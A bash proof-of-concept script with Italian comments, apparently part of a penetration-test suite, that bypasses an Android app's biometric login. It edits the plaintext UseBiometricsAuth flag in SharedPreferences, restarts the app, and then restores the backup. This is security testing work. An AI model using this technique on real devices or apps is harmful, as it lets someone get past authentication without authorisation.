#!/bin/bash
# VULN-03: Biometric Authentication Bypass
source "$(dirname "$0")/00-common.sh"

banner "VULN-03: BIOMETRIC BYPASS"
check_device

BEFORE=$(read_prefs)
BACKUP="/tmp/av-backup-bio.xml"
echo "$BEFORE" > "$BACKUP"

BIO=$(echo "$BEFORE" | grep "UseBiometricsAuth" | sed -n 's/.*value="\([a-z]*\)".*/\1/p')
info "Stato attuale UseBiometricsAuth: $BIO"

if [ "$BIO" = "true" ]; then
    info "Biometria attiva. Disabilito..."
    sed 's/name="UseBiometricsAuth" value="true"/name="UseBiometricsAuth" value="false"/' \
        "$BACKUP" > /tmp/av-nobio.xml
    write_prefs /tmp/av-nobio.xml
    restart_app

    AFTER_BIO=$(read_prefs | grep "UseBiometricsAuth" | sed -n 's/.*value="\([a-z]*\)".*/\1/p')
    ok "UseBiometricsAuth cambiato da true a $AFTER_BIO"
    info ">>> VERIFICA: l'app chiede solo PIN, niente biometria"

    echo ""
    read -p "  Premi INVIO per ripristinare... "
    write_prefs "$BACKUP"
    restart_app
    ok "Stato originale ripristinato"
else
    info "Biometria gia' disabilitata su questo device"
    info "Il flag e' un booleano in chiaro nelle SharedPreferences:"
    echo ""
    echo "$BEFORE" | grep "UseBiometricsAuth" | sed 's/^/       /'
    echo ""
    ok "Su un device con biometria attiva, basta cambiare a false"
fi

banner "RISULTATO: Autenticazione biometrica = booleano editabile"
